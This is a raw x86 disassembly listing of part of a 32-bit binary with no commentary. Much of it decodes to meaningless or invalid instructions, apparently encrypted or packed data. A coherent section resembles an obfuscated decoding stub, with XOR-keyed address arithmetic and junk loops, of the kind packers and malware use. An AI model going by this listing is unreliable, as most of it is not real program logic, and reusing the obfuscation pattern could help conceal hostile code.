  407f2e:	push   ebp
  407f2f:	mov    ch,BYTE PTR [edi]
  407f31:	test   al,0x7a
  407f33:	mov    ds:0x42f8e496,eax
  407f38:	outs   dx,DWORD PTR ds:[esi]
  407f39:	sti    
  407f3a:	inc    esi
  407f3b:	shr    edi,cl
  407f3d:	sub    BYTE PTR [edi+0x7acef4d7],ah
  407f43:	push   es
  407f44:	mov    edx,0xbac5e368
  407f49:	sub    BYTE PTR [ecx],al
  407f4b:	cld    
  407f4c:	push   ecx
  407f4d:	pop    esi
  407f4e:	ja     0x407f7f
  407f50:	push   edx
  407f51:	fld    st(2)
  407f53:	test   cl,bh
  407f55:	inc    eax
  407f56:	jae    0x407eef
  407f58:	and    dl,dl
  407f5a:	inc    edi
  407f5b:	test   DWORD PTR [ebx],ecx
  407f5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f5e:	add    al,0xf8
  407f60:	in     eax,dx
  407f61:	xor    eax,0x64bf298
  407f66:	mov    ebp,0xa923815c
  407f6b:	inc    ecx
  407f6c:	and    eax,0x4a838846
  407f71:	das    
  407f72:	lods   eax,DWORD PTR ds:[esi]
  407f73:	mov    ah,0x96
  407f75:	into   
  407f76:	sbb    eax,0x9207b3e7
  407f7b:	jnp    0x407fb2
  407f7d:	popf   
  407f7e:	and    eax,0xe0b2047
  407f83:	sbb    bl,BYTE PTR [edi+0x64]
  407f86:	dec    esp
  407f87:	mov    bh,0xf6
  407f89:	inc    DWORD PTR [ebp-0x3f6284f9]
  407f8f:	mov    al,ds:0x732abeed
  407f94:	cmp    DWORD PTR [ebp-0x37],esp
  407f97:	cmp    BYTE PTR [ecx+edi*4-0x203352e1],bl
  407f9e:	inc    ebp
  407f9f:	ins    BYTE PTR es:[edi],dx
  407fa0:	jp     0x407f58
  407fa2:	pusha  
  407fa3:	fwait
  407fa4:	jno    0x407feb
  407fa6:	iret   
  407fa7:	jae    0x407f85
  407fa9:	xchg   edi,eax
  407faa:	mov    ah,0x3d
  407fac:	test   eax,0x96053be4
  407fb1:	push   ecx
  407fb2:	retf   
  407fb3:	cld    
  407fb4:	pop    ds
  407fb5:	sub    si,WORD PTR [bx+di-0x65fb]
  407fbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fbc:	push   edx
  407fbd:	enter  0x5701,0x5c
  407fc1:	jge    0x407fdf
  407fc3:	fwait
  407fc4:	ja     0x407f7c
  407fc6:	or     al,0xc2
  407fc8:	pop    esp
  407fc9:	jle    0x407fb8
  407fcb:	lds    ebx,FWORD PTR [eax]
  407fcd:	scas   al,BYTE PTR es:[edi]
  407fce:	pop    edx
  407fcf:	(bad)
  407fd3:	push   ds
  407fd4:	scas   eax,DWORD PTR es:[edi]
  407fd5:	push   ebx
  407fd6:	push   eax
  407fd7:	sbb    BYTE PTR [ebp-0x45cd723],dl
  407fdd:	stos   DWORD PTR es:[edi],eax
  407fde:	xchg   esi,eax
  407fdf:	mov    bl,0x4e
  407fe1:	push   es
  407fe2:	sahf   
  407fe3:	in     eax,dx
  407fe4:	pop    ebp
  407fe5:	lods   al,BYTE PTR ds:[esi]
  407fe6:	pop    ds
  407fe7:	mov    ecx,0x4f667d5e
  407fec:	xor    eax,0x6eba2bb5
  407ff1:	xor    esi,DWORD PTR [edi-0x74]
  407ff4:	(bad)  
  407ff5:	retf   
  407ff6:	ja     0x407fd7
  407ff8:	xor    eax,0x53bbd315
  407ffd:	add    bl,ch
  407fff:	add    dh,bh
  408001:	xchg   esp,eax
  408002:	sbb    al,0x6d
  408004:	or     al,0x7e
  408006:	cwde   
  408007:	(bad)  
  408008:	cli    
  408009:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40800a:	mov    edx,cs
  40800c:	xor    al,0x27
  40800e:	in     al,0x42
  408010:	pop    es
  408011:	lahf   
  408012:	and    BYTE PTR [edx-0x406465f4],ah
  408018:	(bad)  
  408019:	shl    BYTE PTR [ebp+0x35],1
  40801c:	std    
  40801d:	mov    edi,0xdf3acbe6
  408022:	mov    esp,0xa0393d51
  408027:	gs dec esi
  408029:	xchg   ebp,eax
  40802a:	stc    
  40802b:	sar    BYTE PTR [edx-0x1c30fc91],0xfa
  408032:	jne    0x407ffb
  408034:	pop    ecx
  408035:	sbb    eax,DWORD PTR [edi+ebp*4-0x2b]
  408039:	push   0x14
  40803b:	aaa    
  40803c:	sbb    ebp,DWORD PTR [esi+0x73634053]
  408042:	(bad)  
  408043:	jp     0x40804e
  408045:	xchg   ebp,eax
  408046:	add    al,0xe5
  408048:	test   al,0xdf
  40804a:	(bad)  
  40804b:	(bad)  
  40804c:	mov    DWORD PTR [ebx-0x52],esp
  40804f:	ror    DWORD PTR [edx],0x22
  408052:	push   DWORD PTR [edi-0x7e1f2a11]
  408058:	cli    
  408059:	cli    
  40805a:	adc    ebp,DWORD PTR [edi+ecx*8-0x60]
  40805e:	arpl   bp,ax
  408060:	add    bl,BYTE PTR [esp+edx*8+0x25]
  408064:	jl     0x408052
  408066:	inc    ebx
  408067:	sbb    eax,0x818aa929
  40806c:	xor    eax,0x42d2f8a2
  408071:	push   ss
  408072:	mov    esi,0xaba175f1
  408077:	pop    dx
  408079:	aaa    
  40807a:	mov    ds:0x6fae80,eax
  40807f:	mov    ch,0xfc
  408081:	loop   0x408095
  408083:	cdq    
  408084:	lahf   
  408085:	pop    ebx
  408086:	fcmove st,st(5)
  408088:	pop    ds
  408089:	out    0xa5,al
  40808b:	mov    dl,0xa0
  40808d:	call   0x14ba:0xc6330f06
  408094:	(bad)  
  408095:	int    0xff
  408097:	sub    edx,eax
  408099:	jmp    0x4080ad
  40809e:	mov    eax,DWORD PTR [ebp-0x8]
  4080a1:	xor    eax,esi
  4080a3:	mov    edx,0xffcd8d14
  4080a8:	sub    edx,eax
  4080aa:	add    edx,DWORD PTR [ebp-0xc]
  4080ad:	mov    DWORD PTR [ebp-0xc],edx
  4080b0:	mov    eax,DWORD PTR [ebp-0x10]
  4080b3:	cmp    eax,0xf89c85b0
  4080b8:	jne    0x40383c
  4080be:	mov    DWORD PTR [ebp-0x20],0xa
  4080c5:	mov    ebx,DWORD PTR [ebp+0x8]
  4080c8:	xor    ebx,esi
  4080ca:	add    ebx,edi
  4080cc:	lea    eax,[ebx-0x3272ec]
  4080d2:	xor    eax,esi
  4080d4:	cmp    eax,0xf89c95b0
  4080d9:	je     0x40810c
  4080df:	lea    eax,[ebx+ecx*1]
  4080e2:	mov    DWORD PTR [ebp-0x14],eax
  4080e5:	mov    eax,DWORD PTR [ebp-0x28]
  4080e8:	sub    eax,ebx
  4080ea:	mov    DWORD PTR [ebp-0x18],eax
  4080ed:	push   DWORD PTR [ebp-0x18]
  4080f0:	push   DWORD PTR [ebp-0x14]
  4080f3:	call   0x408153
  4080f8:	mov    eax,DWORD PTR [ebp+0xc]
  4080fb:	mov    ecx,DWORD PTR [ebp-0x24]
  4080fe:	xor    eax,esi
  408100:	lea    ebx,[ebx+eax*1+0x3272ec]
  408107:	jmp    0x4080cc
  40810c:	dec    DWORD PTR [ebp-0x20]
  40810f:	jne    0x4080c5
  408115:	mov    eax,DWORD PTR [ebp+0x8]
  408118:	mov    edx,DWORD PTR [ebp+0xc]
  40811b:	mov    ebx,DWORD PTR [ebp+0x8]
  40811e:	xor    edx,esi
  408120:	mov    dl,BYTE PTR [edx+ecx*1+0x3272ec]
  408127:	xor    eax,esi
  408129:	mov    al,BYTE PTR [eax+ecx*1+0x3272ec]
  408130:	xor    ebx,esi
  408132:	mov    BYTE PTR [ebx+ecx*1+0x3272ec],dl
  408139:	mov    edx,DWORD PTR [ebp+0xc]
  40813c:	xor    edx,esi
  40813e:	mov    BYTE PTR [edx+ecx*1+0x3272ec],al
  408145:	mov    eax,DWORD PTR [ebp+0xc]
  408148:	xor    eax,esi
  40814a:	add    eax,edi
  40814c:	pop    edi
  40814d:	pop    esi
  40814e:	pop    ebx
  40814f:	leave  
  408150:	ret    0x8
  408153:	push   ebp
  408154:	mov    ebp,esp
  408156:	sub    esp,0x40
  408159:	add    edx,edx
  40815b:	mov    eax,DWORD PTR [ebp+0xc]
  40815e:	mov    DWORD PTR [ebp-0x18],eax
  408161:	mov    DWORD PTR ds:0x428663,0x712d
  40816b:	mov    eax,DWORD PTR [ebp+0x8]
  40816e:	mov    DWORD PTR [ebp-0x14],0xf89c85b0
  408175:	mov    DWORD PTR ds:0x428613,0x5be4
  40817f:	mov    DWORD PTR [ebp-0x30],eax
  408182:	sub    DWORD PTR ds:0x428667,ebx
  408188:	push   esi
  408189:	xor    DWORD PTR ds:0x42867b,0x42861b
  408193:	push   edi
  408194:	movzx  edi,WORD PTR ds:0x428647
  40819b:	add    DWORD PTR ds:0x428603,edi
  4081a1:	mov    edi,0xf89c85b1
  4081a6:	mov    DWORD PTR ds:0x428653,0x19
  4081b0:	cmp    DWORD PTR ds:0x428653,0x0
  4081b7:	je     0x408208
  4081bd:	cmp    DWORD PTR ds:0x428653,0x7
  4081c4:	jg     0x408208
  4081ca:	jmp    0x4081da
  4081cf:	push   0x428097
  4081d4:	call   DWORD PTR ds:0x4287c3
  4081da:	cmp    DWORD PTR ds:0x428653,0x8
  4081e1:	jne    0x4081f4
  4081e7:	mov    edx,DWORD PTR ds:0x428653
  4081ed:	dec    edx
  4081ee:	mov    DWORD PTR ds:0x428653,edx
  4081f4:	xor    edx,edx
  4081f6:	or     edx,DWORD PTR ds:0x428653
  4081fc:	dec    edx
  4081fd:	mov    DWORD PTR ds:0x428653,edx
  408203:	jmp    0x4081b0
  408208:	mov    DWORD PTR [ebp-0x8],edi
  40820b:	sbb    ecx,0x4b70
  408211:	mov    eax,DWORD PTR [ebp-0x14]
  408214:	mov    edx,DWORD PTR ds:0x4285cf
  40821a:	xor    DWORD PTR ds:0x4285e7,edx
  408220:	mov    ecx,0x75108a4
  408225:	or     DWORD PTR ds:0x4285ef,ecx
  40822b:	xor    eax,ecx
  40822d:	mov    esi,0x3272ec
  408232:	adc    DWORD PTR ds:0x4285db,edi
  408238:	add    eax,esi
  40823a:	mov    DWORD PTR [ebp-0x4],eax
  40823d:	mov    DWORD PTR ds:0x428667,0x1d
  408247:	cmp    DWORD PTR ds:0x428667,0x0
  40824e:	je     0x408296
  408254:	cmp    DWORD PTR ds:0x428667,0x28
  40825b:	jg     0x408296
  408261:	jmp    0x408284
  408266:	push   0x428633
  40826b:	push   DWORD PTR [ebp-0x10]
  40826e:	push   0x7f16
  408273:	push   0x6682
  408278:	push   DWORD PTR [ebp-0x20]
  40827b:	push   DWORD PTR [ebp-0x20]
  40827e:	call   DWORD PTR ds:0x4287c7
  408284:	mov    edx,DWORD PTR ds:0x428667
  40828a:	dec    edx
  40828b:	mov    DWORD PTR ds:0x428667,edx
  408291:	jmp    0x408247
  408296:	mov    eax,DWORD PTR [ebp-0x14]
  408299:	xor    eax,ecx
  40829b:	add    eax,esi
  40829d:	mov    DWORD PTR [ebp+0x8],eax
  4082a0:	mov    DWORD PTR [ebp-0x28],0xf89c8590
  4082a7:	xor    eax,DWORD PTR ds:0x428623
  4082ad:	mov    DWORD PTR [ebp-0x24],0xf89c85bf
  4082b4:	mov    eax,ds:0x4286d7
  4082b9:	mov    edx,DWORD PTR ds:0x4286eb
  4082bf:	sub    eax,edx
  4082c1:	xor    eax,DWORD PTR [eax+edx*1]
  4082c4:	mov    eax,DWORD PTR [ebp-0x14]
  4082c7:	mov    edx,DWORD PTR [ebp-0x18]
  4082ca:	xor    eax,ecx
  4082cc:	sbb    DWORD PTR ds:0x428677,0x289b
  4082d6:	add    eax,esi
  4082d8:	mov    DWORD PTR ds:0x428653,0x7663
  4082e2:	cmp    edx,eax
  4082e4:	je     0x40aa55
  4082ea:	mov    DWORD PTR ds:0x42861f,0x1f7b
  4082f4:	push   ebx
  4082f5:	jmp    0x40aa30
  4082fa:	mov    eax,ds:0x428607
  4082ff:	add    DWORD PTR ds:0x42865b,eax
  408305:	mov    edx,DWORD PTR [ebp-0x4]
  408308:	dec    eax
  408309:	mov    eax,DWORD PTR [ebp-0x18]
  40830c:	and    DWORD PTR ds:0x4285ef,0x33ad
  408316:	mov    ebx,DWORD PTR [ebp-0x28]
  408319:	sub    eax,edx
  40831b:	xor    ebx,ecx
  40831d:	adc    DWORD PTR ds:0x42863f,0x20c9
  408327:	xor    edx,edx
  408329:	add    ebx,esi
  40832b:	sub    DWORD PTR ds:0x428603,0x441d
  408335:	div    ebx
  408337:	xor    edx,DWORD PTR ds:0x42863b
  40833d:	jmp    0x40a6e1
  408342:	sbb    ecx,DWORD PTR [esi+0x78d7a47c]
  408348:	fwait
  408349:	and    esi,0xa516ec02
  40834f:	imul   esp,DWORD PTR [edi+0x7a149fab],0x7a
  408356:	repz pop edi
  408358:	jp     0x4083d4
  40835a:	mov    dl,0x9a
  40835c:	push   ds
  40835d:	sub    ch,BYTE PTR [edx+0x46]
  408360:	iret   
  408361:	enter  0xe604,0x9e
  408365:	add    al,BYTE PTR [ecx+edx*8]
  408368:	jne    0x408389
  40836a:	pop    esi
  40836b:	sbb    al,0x5d
  40836d:	loop   0x4083db
  40836f:	adc    eax,0xceb30739
  408374:	jl     0x4082f6
  408376:	pop    ebp
  408377:	loopne 0x408329
  408379:	mov    edi,0x2c3f91d8
  40837e:	pushf  
  40837f:	adc    DWORD PTR [esp+esi*2+0x4076ea63],eax
  408386:	sbb    BYTE PTR [edx-0x39],dl
  408389:	pop    eax
  40838a:	jb     0x40836b
  40838c:	retf   
  40838d:	pusha  
  40838e:	inc    edi
  40838f:	or     eax,0x48fc11a6
  408394:	inc    esp
  408395:	mov    WORD PTR [eax+0x45],?
  408398:	fstp   DWORD PTR [ecx-0x2]
  40839b:	inc    ebx
  40839c:	mov    ecx,0x9a005bd5
  4083a1:	sbb    DWORD PTR [edx-0x8],ebx
  4083a4:	lea    ecx,[edx]
  4083a6:	mov    ebp,0x50063155
  4083ab:	(bad)  
  4083ac:	out    0xa4,al
  4083ae:	and    DWORD PTR [ebx-0x75],esi
  4083b1:	fistp  DWORD PTR [edx+0x33ddea06]
  4083b7:	dec    eax
  4083b8:	push   ebx
  4083b9:	inc    edx
  4083ba:	mov    eax,ds:0xd2c7f7d8
  4083bf:	dec    edx
  4083c0:	push   ecx
  4083c1:	idiv   ch
  4083c3:	dec    ebp
  4083c4:	call   0x1b6664ed
  4083c9:	cwde   
  4083ca:	mov    ch,0xea
  4083cc:	mov    eax,0x66424b76
  4083d1:	pop    esi
  4083d2:	or     BYTE PTR [ecx+edi*4-0x25],bh
  4083d6:	fadd   st,st(0)
  4083d8:	test   al,0xb0
  4083da:	sub    DWORD PTR [ebx],ebp
  4083dc:	cmc    
  4083dd:	push   ds
  4083de:	sti    
  4083df:	aam    0xee
  4083e1:	popa   
  4083e2:	xor    ebp,ebp
  4083e4:	loope  0x408397
  4083e6:	jno    0x40840e
  4083e8:	add    BYTE PTR [esi+0x4d],dh
  4083eb:	mov    ebp,0x7f4bac28
  4083f0:	fxch   st(5)
  4083f2:	dec    eax
  4083f3:	push   es
  4083f4:	cmp    BYTE PTR [edi+esi*2+0x3b65702d],ah
  4083fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083fc:	mov    DWORD PTR ds:0x43734ee1,ebx
  408402:	xchg   esp,eax
  408403:	jle    0x408447
  408405:	adc    eax,0xe1f753f2
  40840a:	sbb    BYTE PTR [ebx+0x4e],cl
  40840d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40840e:	clc    
  40840f:	adc    DWORD PTR [edx+0x4d4badba],ecx
  408415:	dec    eax
  408416:	push   cs
  408417:	addr16 das 
  408419:	(bad)  
  40841a:	repz (bad) 
  40841c:	out    dx,al
  40841d:	xchg   ecx,eax
  40841e:	sbb    BYTE PTR [edi+eax*4],bh
  408421:	enter  0x371f,0xf3
  408425:	mov    ds:0xf68f254e,eax
  40842a:	sbb    DWORD PTR [ebp+0x3e7b6bd4],ebp
  408430:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408431:	fimul  WORD PTR [ebp-0x25]
  408434:	scas   al,BYTE PTR es:[edi]
  408435:	sub    DWORD PTR [edx+0x5a2c0086],ebx
  40843b:	(bad)  
  40843c:	sti    
  40843d:	in     al,0xcc
  40843f:	xchg   DWORD PTR [ecx+0x1f064811],ebp
  408445:	lock ins DWORD PTR es:[edi],dx
  408447:	cdq    
  408448:	mov    bl,0x36
  40844a:	sbb    ecx,DWORD PTR [ecx]
  40844c:	in     al,dx
  40844d:	outs   dx,DWORD PTR ds:[esi]
  40844e:	cmp    BYTE PTR [esi],dl
  408450:	sar    BYTE PTR [eax+edi*2-0x55485774],1
  408457:	jecxz  0x4084b0
  408459:	and    BYTE PTR [eax+0x62],cl
  40845c:	scas   eax,DWORD PTR es:[edi]
  40845d:	mov    esp,0x75a5548e
  408462:	sub    BYTE PTR [esi+0x71],0x4d
  408466:	imul   edx,DWORD PTR [esp+eiz*2+0x42975c77],0x231ca98
  408471:	xchg   ecx,eax
  408472:	test   DWORD PTR [eax-0x45],esp
  408475:	mov    ds:0xe8a6634d,al
  40847a:	and    al,0x2a
  40847c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40847d:	push   edx
  40847e:	jmp    0x4084b5
  408480:	enter  0x3b95,0xfd
  408484:	jae    0x40842e
  408486:	cli    
  408487:	pop    ss
  408488:	jnp    0x408507
  40848a:	loope  0x40841e
  40848c:	jne    0x4084cc
  40848e:	ins    BYTE PTR es:[edi],dx
  40848f:	into   
  408490:	pop    gs
  408492:	sub    ebp,ecx
  408494:	cdq    
  408495:	fcmovne st,st(4)
  408497:	xlat   BYTE PTR ds:[ebx]
  408498:	adc    ebp,0xffffff8f
  40849b:	jo     0x4084d0
  40849d:	mov    dl,0x8c
  40849f:	push   ebx
  4084a0:	daa    
  4084a1:	lods   eax,DWORD PTR ds:[esi]
  4084a2:	sbb    ch,BYTE PTR [esi-0x42]
  4084a5:	rcr    BYTE PTR [edx],cl
  4084a7:	jae    0x408508
  4084a9:	imul   ebx,DWORD PTR [ebx-0x5403bc89],0xb06aebd8
  4084b3:	outs   dx,DWORD PTR ds:[esi]
  4084b4:	scas   eax,DWORD PTR es:[edi]
  4084b5:	stos   DWORD PTR es:[edi],eax
  4084b6:	adc    eax,DWORD PTR [edi]
  4084b8:	cmp    BYTE PTR [eax+0x1302d536],dl
  4084be:	rcl    BYTE PTR [ebp+0x55],cl
  4084c1:	fst    DWORD PTR [ebx]
  4084c3:	inc    esi
  4084c4:	push   es
  4084c5:	sub    DWORD PTR [edx],edi
  4084c7:	aaa    
  4084c8:	sbb    al,0x87
  4084ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084cb:	pop    ebx
  4084cc:	sub    edx,DWORD PTR [ecx]
  4084ce:	out    dx,al
  4084cf:	and    cl,bl
  4084d1:	(bad)  
  4084d2:	pop    ecx
  4084d3:	int3   
  4084d4:	adc    dl,BYTE PTR [ebx]
  4084d6:	shr    DWORD PTR [ecx-0x5003c656],1
  4084dc:	fs daa 
  4084de:	pop    ebp
  4084df:	aam    0x73
  4084e1:	adc    BYTE PTR [ecx-0x79cda154],dh
  4084e7:	mov    cl,0x84
  4084e9:	pop    ss
  4084ea:	jmp    0x40846c
  4084ec:	pusha  
  4084ed:	fsub   DWORD PTR [ecx+0x71c8033c]
  4084f3:	mov    WORD PTR [eax],cs
  4084f5:	scas   al,BYTE PTR es:[edi]
  4084f6:	into   
  4084f7:	dec    ebx
  4084f8:	mov    cl,0x35
  4084fa:	fstp   QWORD PTR [esi+0x29e3132b]
  408500:	mov    dl,0x6d
  408502:	outs   dx,BYTE PTR ds:[esi]
  408503:	xor    eax,0x8c6b4ba3
  408508:	mov    ebx,0xb9d4cb84
  40850d:	ins    BYTE PTR es:[edi],dx
  40850e:	mov    edi,0xa87e2314
  408513:	into   
  408514:	out    dx,eax
  408515:	pand   mm7,QWORD PTR [ebp+ebp*4-0x55]
  40851a:	sar    DWORD PTR [ebx+0x14],1
  40851d:	mov    ebx,0xde71a715
  408522:	loope  0x40852c
  408524:	jmp    0xe73ecd5a
  408529:	push   ebx
  40852a:	outs   dx,DWORD PTR ds:[esi]
  40852b:	jle    0x4084dd
  40852d:	icebp  
  40852e:	sbb    al,0x70
  408530:	retf   
  408531:	sub    bh,al
  408533:	(bad)  
  408534:	mov    dh,0xa0
  408537:	jno    0x4085ab
  408539:	test   BYTE PTR [ebx+0x68],0x21
  40853d:	das    
  40853e:	cmc    
  40853f:	mov    ecx,0x8cbbd60b
  408544:	dec    ebp
  408545:	xchg   edx,eax
  408546:	sub    eax,DWORD PTR [eax]
  408548:	pop    ds
  408549:	pusha  
  40854a:	add    al,0xc7
  40854c:	popa   
  40854d:	icebp  
  40854e:	(bad)  
  408550:	sar    cl,1
  408552:	xor    dh,ah
  408554:	into   
  408555:	push   0x63
  408557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408558:	or     BYTE PTR [edi+0x79],dh
  40855b:	and    al,0x59
  40855d:	ja     0x4084e7
  40855f:	push   esp
  408560:	pop    ds
  408561:	sbb    bh,dh
  408563:	xchg   ebx,eax
  408564:	cmp    ch,BYTE PTR [ebx]
  408566:	jge    0x408520
  408568:	ror    DWORD PTR [ebp+0x46],cl
  40856b:	and    edx,0x43db9b09
  408571:	xor    edx,eax
  408573:	int    0xca
  408575:	dec    edi
  408576:	fs test eax,0x86c2f1d2
  40857c:	mov    ebp,0x4d89ba75
  408581:	xlat   BYTE PTR ds:[ebx]
  408582:	es ins BYTE PTR es:[edi],dx
  408584:	mov    esp,0xa91223b3
  408589:	push   es
  40858a:	xchg   ecx,eax
  40858b:	or     ch,bl
  40858d:	push   es
  40858e:	mov    esp,0xb95d566c
  408593:	stos   DWORD PTR es:[edi],eax
  408594:	fld    TBYTE PTR [esi]
  408596:	pop    es
  408597:	lods   al,BYTE PTR ds:[esi]
  408598:	ins    DWORD PTR es:[edi],dx
  408599:	mov    cl,0x3e
  40859b:	pop    esi
  40859c:	and    esp,0x2c056e06
  4085a2:	imul   esi,DWORD PTR [esi+0x2e],0xef476e81
  4085a9:	push   0xa5abc360
  4085ae:	push   ss
  4085af:	mov    al,ds:0xc3e675e7
  4085b4:	out    dx,al
  4085b5:	cmp    dh,BYTE PTR [esi+0x32]
  4085b8:	hlt    
  4085b9:	push   ds
  4085ba:	js     0x4085ca
  4085bc:	pop    esi
  4085bd:	push   ebp
  4085be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085bf:	dec    esi
  4085c0:	or     BYTE PTR [eax-0x4a9bdac4],0xc4
  4085c7:	aaa    
  4085c8:	cmp    esp,0x2a398c1
  4085ce:	and    BYTE PTR [ecx-0x9],ah
  4085d1:	ja     0x4085bf
  4085d3:	pop    ds
  4085d4:	push   edx
  4085d5:	cs mov dh,0xad
  4085d8:	inc    esp
  4085d9:	or     DWORD PTR [esi],esp
  4085db:	xchg   ebp,eax
  4085dc:	stos   BYTE PTR es:[edi],al
  4085dd:	enter  0xf0bc,0x57
  4085e1:	outs   dx,BYTE PTR ds:[esi]
  4085e2:	mov    eax,0x433becd3
  4085e7:	popf   
  4085e8:	mov    WORD PTR [ebp-0x47ba2f70],ss
  4085ee:	es cli 
  4085f0:	add    DWORD PTR [ebp+edx*1+0x774e86dc],ecx
  4085f7:	jge    0x4085d1
  4085f9:	cld    
  4085fa:	in     al,dx
  4085fb:	ret    
  4085fc:	sub    BYTE PTR [ebx+0x896ceb8],al
  408602:	xchg   ecx,eax
  408603:	dec    edi
  408604:	daa    
  408605:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408606:	xor    al,0xb0
  408608:	pmaxub mm5,mm4
  40860b:	pop    es
  40860c:	dec    ebx
  40860d:	jl     0x40864c
  40860f:	psadbw mm1,QWORD PTR [ecx+edi*1+0x44a6bd2f]
  408617:	mov    cl,0x22
  408619:	clc    
  40861a:	adc    dh,dl
  40861c:	lahf   
  40861d:	leave  
  40861e:	shr    al,0x60
  408621:	jle    0x408607
  408623:	gs jge 0x40864c
  408626:	xchg   esi,eax
  408627:	stos   DWORD PTR es:[edi],eax
  408628:	sub    al,0xff
  40862a:	sub    al,0xb2
  40862c:	push   ebx
  40862d:	call   ecx
  40862f:	popa   
  408630:	lods   eax,DWORD PTR ds:[esi]
  408631:	sbb    ecx,eax
  408633:	imul   esp,DWORD PTR [ecx+0x42],0xf237ca55
  40863a:	stos   DWORD PTR es:[edi],eax
  40863b:	ds loop 0x408666
  40863e:	adc    al,0x79
  408640:	call   0x5da2:0x3d3e6fc2
  408647:	arpl   WORD PTR [eax+0xc],bp
  40864a:	aam    0xe6
  40864c:	retf   
  40864d:	fwait
  40864e:	mov    cl,0x16
  408650:	xchg   ebx,eax
  408651:	fs ret 
  408653:	retf   
  408654:	and    cl,BYTE PTR [ecx+esi*8]
  408657:	daa    
  408658:	cmp    bh,dh
  40865a:	cmp    dl,0xbd
  40865d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40865e:	pop    edx
  40865f:	mov    bh,0x6b
  408661:	push   ecx
  408662:	xor    al,0x85
  408664:	hlt    
  408665:	ret    
  408666:	punpckhwd mm3,QWORD PTR [ecx-0x67]
  40866a:	sbb    BYTE PTR [esi+0x7c],ah
  40866d:	lahf   
  40866e:	pop    esi
  40866f:	(bad)  
  408670:	loope  0x4086c6
  408672:	pop    ebx
  408673:	mov    ds:0x9a752b9a,eax
  408678:	(bad)  
  408679:	jp     0x40862f
  40867b:	and    eax,0x55cccadf
  408680:	scas   al,BYTE PTR es:[edi]
  408681:	jge    0x4086df
  408683:	mov    ecx,0xa91dbde7
  408688:	leave  
  408689:	scas   al,BYTE PTR es:[edi]
  40868a:	mov    esp,0x46aa02e9
  40868f:	pop    edi
  408690:	mov    WORD PTR [esi+esi*8],cs
  408693:	dec    esi
  408694:	loop   0x408640
  408696:	(bad)  
  408697:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408698:	out    dx,eax
  408699:	ja     0x40865f
  40869b:	test   eax,0xc6ce98f5
  4086a0:	repnz fild WORD PTR [edi+0x2c8224aa]
  4086a7:	inc    edi
  4086a8:	xor    eax,0x94d3c750
  4086ad:	addr16 xchg esi,eax
  4086af:	mov    edx,DWORD PTR [eax-0x103169e6]
  4086b5:	adc    edx,0x1c63717d
  4086bb:	inc    edx
  4086bc:	inc    eax
  4086bd:	mov    bh,0x59
  4086bf:	cld    
  4086c0:	sub    al,0x81
  4086c2:	enter  0x52b3,0x2c
  4086c6:	push   edi
  4086c7:	add    eax,0x820dfceb
  4086cc:	mov    eax,0xb8cdb6b2
  4086d1:	pop    edi
  4086d2:	imul   ebp,DWORD PTR [ebp+0x68c9c958],0x25
  4086d9:	pushf  
  4086da:	(bad)  
  4086db:	jbe    0x408719
  4086dd:	(bad)  
  4086de:	retf   
  4086df:	mov    ecx,0xbb02ad91
  4086e4:	es lock fadd DWORD PTR fs:[ebp+0x319f13f7]
  4086ed:	ds add dh,cl
  4086f0:	push   0xffffffae
  4086f2:	mov    ch,0xd
  4086f4:	das    
  4086f5:	out    0x8c,eax
  4086f7:	or     cl,ah
  4086f9:	ja     0x40873d
  4086fb:	mov    esp,0x13062900
  408700:	inc    esi
  408701:	gs add edi,ebp
  408704:	pop    esp
  408705:	mov    esp,0x4acf9bae
  40870a:	mov    dl,0x6c
  40870c:	test   edx,ebx
  40870e:	sub    al,0x34
  408710:	daa    
  408711:	cmp    BYTE PTR [edx+esi*2+0x41],dh
  408715:	jecxz  0x40875d
  408717:	leave  
  408718:	in     eax,dx
  408719:	stc    
  40871a:	or     al,0xbc
  40871c:	mov    dh,0x2e
  40871e:	jb     0x408787
  408720:	mov    ecx,DWORD PTR [esi-0x2d]
  408723:	and    ch,ah
  408725:	pop    esp
  408726:	out    dx,eax
  408727:	in     al,dx
  408728:	sub    ebp,DWORD PTR [esi+0x63a7e057]
  40872e:	ret    
  40872f:	mov    ds:0xa4ff6a47,al
  408734:	push   edi
  408735:	sahf   
  408736:	(bad)  
  408737:	rol    BYTE PTR [edx],0x63
  40873a:	and    eax,DWORD PTR [ebp-0xd]
  40873d:	hlt    
  40873e:	out    0x99,eax
  408740:	in     eax,0xa9
  408742:	sbb    esi,DWORD PTR [ebx]
  408744:	ja     0x408713
  408746:	and    BYTE PTR [edx+edx*8+0x1abe2059],ch
  40874d:	cmp    eax,DWORD PTR [edi]
  40874f:	fld    DWORD PTR [ecx]
  408751:	xor    eax,DWORD PTR [ecx+0x5]
  408754:	push   0xffffffcf
  408756:	(bad)  
  408757:	xchg   ebx,eax
  408758:	or     ch,BYTE PTR [ecx+0x7de8db72]
  40875e:	hlt    
  40875f:	iret   
  408760:	cmc    
  408761:	mov    al,0x9a
  408763:	jno    0x40871e
  408765:	aam    0xfe
  408767:	mov    bl,0xbe
  408769:	add    al,0x84
  40876b:	pop    edx
  40876c:	ds (bad) 
  40876e:	stos   DWORD PTR es:[edi],eax
  40876f:	aam    0x93
  408771:	xchg   edi,eax
  408772:	adc    BYTE PTR [ebp-0x136b96fd],cl
  408778:	cmovg  esp,DWORD PTR [eax+0x72]
  40877c:	add    BYTE PTR [ebp+0xd22bb08],ch
  408782:	pop    esp
  408783:	in     eax,0x8a
  408785:	outs   dx,DWORD PTR ds:[esi]
  408786:	mov    al,ds:0xe3f4941
  40878b:	sub    eax,0x5f726585
  408790:	fcomip st,st(1)
  408792:	jnp    0x40879f
  408794:	cld    
  408795:	(bad)  
  408796:	mov    ebp,0xb4ac4e69
  40879b:	and    esp,ebp
  40879d:	(bad)  
  40879f:	mov    eax,0xe04b4841
  4087a4:	xchg   edx,eax
  4087a5:	pop    edi
